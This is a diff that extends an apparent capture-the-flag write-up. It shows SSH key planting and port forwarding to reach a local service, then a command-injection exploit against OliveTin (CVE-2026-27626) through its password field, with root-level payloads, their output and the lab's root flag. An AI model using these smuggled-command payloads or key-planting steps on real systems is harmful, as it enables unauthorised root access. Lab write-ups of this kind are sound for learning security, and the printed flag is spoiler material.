@@ -110,3 +110,43 @@ ssh through password is disabled so switch users. -- ``su haris``
 services running locally 
 
 <img width="693" height="465" alt="Screenshot 2026-07-06 at 13 16 03" src="https://github.com/user-attachments/assets/8c881923-d702-4d94-8bab-b6b7d9692151" />
+
+in port 1337 there is a service running to access it we need to do port forwarding using ssh key authentication.
+
+1 - generate an ssh key for our user. 
+``` ssh-keygen -t rsa -b 4096 -f ~/id_rsa_pivot```
+
+2 - copy the public key to paste in the haris user from the reverse shell.( id_rsa_pivot.pub)
+
+3 - paste the public key of our user in /.ssh/authorized_keys file.
+
+port forwarding ::
+
+```ssh -i ~/id_rsa_pivot -L 8080:localhost:1337 haris@10.129.108.212```
+
+now we are able to get the service running in 1337 locally in remote service on our localhost 8080.
+
+### olivetin v3000.10.0 CVE-2026-27626 os command injection 
+
+CVE-2026-27626 - https://github.com/advisories/GHSA-49gm-hh7w-wfvf
+
+olivetin - allows users to run predefined Linux shell commands or scripts via a simple, touch-friendly dashboard.
+
+in the password field it is supporting command injection vulnerbility.
+
+```
+payload: 
+'; id; echo '
+
+output : uid=0(root) gid=0(root) groups=0(root)
+ ```
+
+get the root flag :
+```
+payload :
+'; cat /root/root.txt; echo '
+```
+
+```
+root flag : 6bf69fdeb746151dfbc3ce455f8630ee
+````
